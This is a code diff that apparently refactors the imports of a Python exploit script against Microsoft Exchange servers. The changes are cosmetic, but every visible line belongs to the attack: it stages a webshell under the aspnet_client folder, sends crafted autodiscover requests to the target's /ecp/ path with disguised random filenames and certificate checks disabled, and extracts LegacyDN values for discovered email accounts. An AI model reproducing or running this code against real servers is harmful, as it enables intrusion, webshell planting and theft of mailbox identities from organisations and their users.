@@ -1,10 +1,10 @@
 import sys
 
-import random
-import string
-import re
 import urllib3
 import requests
+import random
+from re import findall
+from string import ascii_lowercase
 
 
 urllib3.disable_warnings()
@@ -24,7 +24,6 @@ webshell_path = f"inetpub\\wwwroot\\aspnet_client\\{webshell_name}"
 webshell_unc_path = f"\\\\127.0.0.1\\c$\\{webshell_path}"
 
 def getRandom():
-    chars = string.ascii_lowercase
     suffix_list = [
         ".axd", ".crx", ".css", ".eot", ".gif", ".jpg", ".is",
         ".htm", ".html", ".ico", ".manifest", ".mp3", ".msi",
@@ -33,7 +32,7 @@ def getRandom():
     ]
 
     for name_len in range(random.randint(5, 9)):
-        prefix_str = "".join(random.choice(chars) for _ in range(name_len))
+        prefix_str = "".join(random.choice(ascii_lowercase) for _ in range(name_len))
 
     filename = f"{prefix_str}{random.choice(suffix_list)}"
     return filename
@@ -86,7 +85,7 @@ def exploit(target):
             resc = req.post(url=f"{target}/ecp/{getRandom()}", headers=berc_headers, data=autodiscover_data, verify=False)
             if f"DisplayName" in resc.text:
                 print(f"[+] Email: {email}")
-                legacydn = re.findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
+                legacydn = findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
                 break
             else:
                 print("[-] No LegacyDN")
@@ -216,6 +215,7 @@ def exploit(target):
 
 def main(argv):
     target = f"https://{argv[1]}"
+
     exploit(target)
 
 
